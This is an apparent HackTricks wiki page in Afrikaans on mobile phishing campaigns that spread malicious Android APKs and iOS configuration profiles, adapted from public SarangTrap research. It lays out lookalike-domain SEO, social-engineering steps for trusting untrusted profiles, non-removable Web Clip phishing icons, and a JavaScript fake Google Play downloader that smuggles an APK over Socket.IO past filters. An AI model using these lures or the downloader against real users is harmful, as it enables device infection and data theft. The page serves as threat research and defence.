# Mobiele Phishing en Verspreiding van Kwaadwillige Apps (Android en iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat bedreigingsakteurs gebruik om **kwaadwillige Android APKs** en **iOS-mobiele-konfigurasieprofiele** deur middel van phishing te versprei (SEO, sosiale manipulasie, vals winkels, dating-apps, ens.).
> Die materiaal is aangepas uit die SarangTrap-veldtog wat deur Zimperium zLabs blootgelê is (2025), en ander openbare navorsing.<sup>[[1]](#references)</sup>

## Aanvalsvloei

1. **SEO/Phishing-infrastruktuur**
   * Registreer dosyne domeine wat soortgelyk lyk (dating, wolkdeling, motordiens…).
     – Gebruik sleutelwoorde en emoji’s in die plaaslike taal in die `<title>`-element om hoër in Google se ranglys te verskyn.
     – Bied *beide* Android- (`.apk`) en iOS-installeringsinstruksies op dieselfde bestemmingsbladsy aan.
2. **Eerste Fase-aflaai**
   * Android: direkte skakel na ’n *unsigned* APK of een van ’n “third-party store”.
   * iOS: ’n `itms-services://`- of gewone HTTPS-skakel na ’n kwaadwillige **mobileconfig**-profiel (sien hieronder).
3. **Android-gedrag ná installering**
   * C2-beheerde uitvoering, misbruik van toestemmings, omseiling van droppers, versameling in die agtergrond en ander malware-gedrag ná installering word op die toegewyde Android Malware Post-Exploitation-bladsy hieronder behandel.
4. **iOS-afleweringstegniek**
   * ’n Enkele **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, ens. aanvra om die toestel by MDM-agtige toesig in te skryf.
   * Instruksies vir sosiale manipulasie:
     1. Maak Settings ➜ *Profiel afgelaai* oop.
     2. Tik drie keer op *Installeer* (skermkiekies op die phishing-bladsy).
     3. Vertrou die ongetekende profiel ➜ die aanvaller kry *Contacts*- en *Photo*-entitlements sonder App Store-oorsig.
5. **iOS Web Clip-lading (phishing-app-ikoon)**
   * `com.apple.webClip.managed`-ladings kan **’n phishing-URL met ’n handelsmerkikoon/-etiket aan die Home Screen vaspen**.
   * Web Clips kan **volskerm** werk (verberg die blaaierkoppelvlak) en as **nie-verwyderbaar** gemerk word, wat die slagoffer dwing om die profiel te verwyder om die ikoon te verwyder.<sup>[[3]](#references)</sup>
6. **Netwerklaag**
   * Gewone HTTP, dikwels op poort 80 met ’n HOST-opskrif soos `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om raak te sien).

## Android Malware Post-Exploitation

Vir Android-malware-taktieke ná installering, soos C2, misbruik van Accessibility, overlays, ATS-outomatisering, gelaagde DEX-laaiing, premium SMS en volharding, sien:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK-smokkelary via Socket.IO/WebSocket + Vals Google Play-bladsye

Aanvallers vervang toenemend statiese APK-skakels met ’n Socket.IO/WebSocket-kanaal wat in lokmiddels ingebed is wat soos Google Play lyk. Dit verberg die URL van die lading, omseil URL-/uitbreidingsfilters en behou ’n realistiese installeringservaring.<sup>[[2]](#references)[[4]](#references)</sup>

Tipiese kliëntvloei wat in die praktyk waargeneem is:

<details>
<summary>Vals Socket.IO Play-aflaaier (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Waarom dit eenvoudige kontroles omseil:
- Geen statiese APK-URL word blootgestel nie; die payload word in die geheue uit WebSocket-raampies gerekonstrueer.
- URL-/MIME-/uitbreidingsfilters wat direkte .apk-antwoorde blokkeer, kan dalk binêre data miskyk wat via WebSockets/Socket.IO getonnel word.
- Kruipers en URL-sandkaste wat nie WebSockets uitvoer nie, sal nie die payload ophaal nie.

Sien ook WebSocket-tradecraft en -nutsgoed:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Die Donker Kant van Romantiek: SarangTrap-afpersingsveldtog](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips-payloadinstellings vir Apple-toestelle](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker-Trojaan wat Indonesiese en Viëtnamese Android-gebruikers teiken](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
